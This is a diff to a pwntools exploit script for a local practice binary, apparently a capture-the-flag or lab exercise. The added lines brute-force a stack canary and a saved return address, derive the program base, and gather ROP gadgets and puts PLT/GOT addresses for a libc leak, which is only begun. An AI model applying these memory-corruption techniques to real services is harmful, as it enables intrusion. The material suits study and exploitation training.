@@ -7,7 +7,7 @@ context.terminal = ["wezterm", "start", "--"]
 # context.terminal = ["tmux", "splitw", "-h"]
 
 p = process("./vuln")
-# p = gdb.debug("./vuln")
+# gdb.attach(p, api=True)
 
 e = ELF("./vuln")
 
@@ -72,7 +72,9 @@ overflow_to_rip = overflow_to_canary + 8 + 8 + 8 + 8
 
 
 # 1 - Bruteforce the canary value.
-# Since we can overwrite part of the
+#
+# Oracle: We _don't_ see "*** stack smashing detected ***" when the canary is
+# intact.
 
 payload = b"A" * overflow_to_canary
 
@@ -90,11 +92,63 @@ for _ in range(7):
             found_canary += bytes([j])
             break
 
-print("canary found = ", hex(u64(found_canary)))
+info(f"canary found = {hex(u64(found_canary))}")
+
 pause()
 
 # 2 - Brute force `overflow`'s return address (saved RIP).
+#
+# Oracle: We see "Thanks!" when the child _doesn't_ segfault.
 
-# 3 - Leak libc's address to default ALSR
+payload = b"A" * overflow_to_canary
+payload += p64(u64(found_canary))
+payload += b"B" * 8  # Saved RBP
 
-# p.interactive()
+bad_chars = [0x9, 0x14, 0x16, 0x1B]
+found_rip = b""
+for _ in range(6):  # Only 6 bytes matter; we `ljust` to 8 later
+    for j in range(256):
+        if j not in bad_chars:
+            tmp_payload = payload + found_rip + bytes([j])
+            p.sendafter(b"Hey, whats your name!?\n\n", tmp_payload)
+
+            resp = p.recvline()
+
+            if b"Thanks!" in resp:
+                found_rip += bytes([j])
+                break
+
+found_rip = u64(found_rip.ljust(8, b"\x00"))
+main = found_rip - 44  # `found_rip` is main+44
+
+info(f"saved RIP found = {hex(found_rip)}")
+info(f"main = {hex(main)}")
+
+pause()
+
+main_offset = e.symbols["main"]
+info(f"main_offset = {hex(main_offset)}")
+vuln_base = main - main_offset
+info(f"vuln_base = {hex(vuln_base)}")
+
+pop_rdi_ret_offset = rop.find_gadget(["pop rdi", "ret"]).address
+ret_offset = rop.find_gadget(["ret"]).address
+
+puts_plt_offset = e.plt["puts"]
+puts_got_offset = e.got["puts"]
+
+pop_rdi_ret = vuln_base + pop_rdi_ret_offset
+info(f"pop_rdi_ret = {hex(pop_rdi_ret)}")
+ret = vuln_base + ret_offset
+info(f"ret = {hex(ret)}")
+puts_plt = vuln_base + puts_plt_offset
+info(f"puts_plt = {hex(puts_plt)}")
+puts_got = vuln_base + puts_got_offset
+info(f"puts_got = {hex(puts_got)}")
+
+pause()
+
+# 3 - Leak libc's address with `puts` to defeat ALSR
+
+payload = b"A" * overflow_to_canary
+p.interactive()
